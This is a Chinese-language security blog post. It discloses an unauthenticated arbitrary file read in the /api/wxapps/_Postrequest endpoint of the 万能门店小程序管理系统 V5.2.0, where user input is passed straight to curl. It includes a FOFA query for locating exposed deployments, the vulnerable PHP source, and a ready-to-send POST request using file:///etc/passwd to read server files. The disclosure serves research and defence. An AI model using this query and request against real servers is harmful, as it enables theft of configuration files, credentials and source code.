---
title: "万能门店小程序管理系统 /api/wxapps/_Postrequest 文件读取漏洞"
source: https://mrxn.net/jswz/api-wxapps-_Postrequest-fileread.html
asset_dir: assets/万能门店小程序管理系统-apiwxapps_postrequest-文件读取漏洞
---

# 万能门店小程序管理系统 /api/wxapps/\_Postrequest 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/18 18:36
* 824浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

验证

开源软件

应用程序


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。该系统集成了会员管理和会员营销两大核心功能，支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统的/api/wxapps/\_Postrequest接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，未经身份验证的攻击者可以通过该漏洞下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。

音频与视频聊天

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
function _Postrequest($url, $data, $ssl = true, $token = '') //0正常， 1头条
    {
        if (!$token) {
            $headers = [
                "Content-type: application/json;charset='utf-8'"
            ];
        } else {

            $headers = [
                "X-Token: " . $token
            ];
        }
        //curl完成
        $curl = curl_init();
        //设置curl选项
        curl_setopt($curl, CURLOPT_URL, $url);//URL
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 FirePHP/0.7.4';
        curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);//user_agent，请求代理信息
        curl_setopt($curl, CURLOPT_AUTOREFERER, true);//referer头，请求来源
        curl_setopt($curl, CURLOPT_TIMEOUT, 30);//设置超时时间
        //SSL相关
        if ($ssl) {
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);//禁用后cURL将终止从服务端进行验证
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);//检查服务器SSL证书中是否存在一个公用名(common name)。
        }
        // 处理post相关选项
        curl_setopt($curl, CURLOPT_POST, true);// 是否为POST请求
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);// 处理请求数据
        // 处理响应结果
        curl_setopt($curl, CURLOPT_HEADER, false);//是否处理响应头
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);//curl_exec()是否返回响应结果
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

        curl_setopt($curl, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        // 发出请求
        $response = curl_exec($curl);
        if (false === $response) {
            echo '<br>', curl_error($curl), '<br>';
            return false;
        }
        curl_close($curl);
        return $response;
    }
```

深入探索

漏洞扫描服务

安全认证考试

服务器安全服务

`$url` 直接传入 curl 中造成可使用php伪协议造成任意文件读取文件[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/_Postrequest HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

url=file:///etc/passwd&data=1
```

[![万能门店小程序管理系统 /api/wxapps/_Postrequest 文件读取漏洞](images/img-001-34b8a255a672.webp)](https://image.mrxn.net/580b767a16c147d5815e39a3fac83cd9.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/\_Postrequest 文件读取漏洞](https://mrxn.net/jswz/api-wxapps-_Postrequest-fileread.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-_Postrequest-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

编程

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-\_Postrequest-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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